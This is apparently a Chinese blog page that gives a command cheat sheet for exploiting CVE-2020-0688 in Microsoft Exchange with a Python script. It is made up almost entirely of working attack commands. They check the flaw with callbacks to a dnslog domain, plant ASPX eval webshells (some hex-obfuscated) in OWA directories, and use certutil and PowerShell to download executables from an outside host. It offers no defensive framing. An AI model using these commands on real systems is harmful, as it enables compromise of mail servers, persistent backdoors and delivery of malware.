        <h2 id="1、CVE-2020-0688"><a href="#1、CVE-2020-0688" class="headerlink" title="1、CVE-2020-0688"></a>1、CVE-2020-0688</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.1、验证漏洞是否存在：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.2/owa -u admin -p password -c <span class="string">"cmd /c ping xxx.dnslog.cn"</span></span><br><span class="line">1.2、绝对路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa -u admin -p password -c <span class="string">"cmd /c echo ^&lt;% @Page Language=\\\"Jscript\\\"%^&gt;^&lt;%eval(Request.Item[\\\"password\\\"],\\\"unsafe\\\");%^&gt;  &gt;\"\"C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.3、相对路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa  -u admin -p password  -c   <span class="string">"cmd /c echo ^&lt;%@PAGE LANGUAGE=JSCRIPT%^&gt;^&lt;%var PAY:String=Request[\\\"\x61\x61\x61\x61\\\"];eval(PAY,\\\"\x75\x6E\x73\x61\\\"+\\\"\x66\x65\\\");%^&gt;  &gt;\"\"%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.4、网盘路径写入网马：</span><br><span class="line">python cve-2020-0688.py  -s https://127.0.0.2/owa  -u admin  -p password  -c   <span class="string">"cmd /c echo ^&lt;%@PAGE LANGUAGE=JSCRIPT%^&gt;^&lt;%var PAY:String=Request[\\\"\x61\x61\x61\x61\\\"];eval(PAY,\\\"\x75\x6E\x73\x61\\\"+\\\"\x66\x65\\\");%^&gt;  &gt;\"\"\\127.0.0.1\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\""</span></span><br><span class="line">1.6、验证文件是否存在：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.2/owa  -u admin  -p password -c   <span class="string">"cmd /c dir \"\"%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\xxxx.aspx\"\" | findstr bytes &amp;&amp; ping 1111.dnslog.cn || ping 2222.dnslog.cn"</span></span><br><span class="line">1.7、certutil写文件：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.1/owa  -u admin -p password -c  <span class="string">"cmd /c certutil -urlcache -split -f http://127.0.0.2:80/1.txt 1.txt"</span></span><br><span class="line">1.8、powershell-wget写文件：</span><br><span class="line">python cve-2020-0688.py  -s  https://127.0.0.1/owa  -u admin -p password -c  <span class="string">"cmd /c powershell -Command wget -Uri "</span>http://127.0.0.2:80/1.exe<span class="string">" -OutFile 1.exe"</span></span><br><span class="line">1.9、powershell-object写文件：</span><br><span class="line">python3 cve-2020-0688.py  -s https://127.0.0.1/owa -u admin -p password -c <span class="string">"cmd /c powershell (new-object System.Net.WebClient).DownloadFile('http://127.0.0.2:80/2.exe','2.exe')"</span></span><br></pre></td></tr></table></figure>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
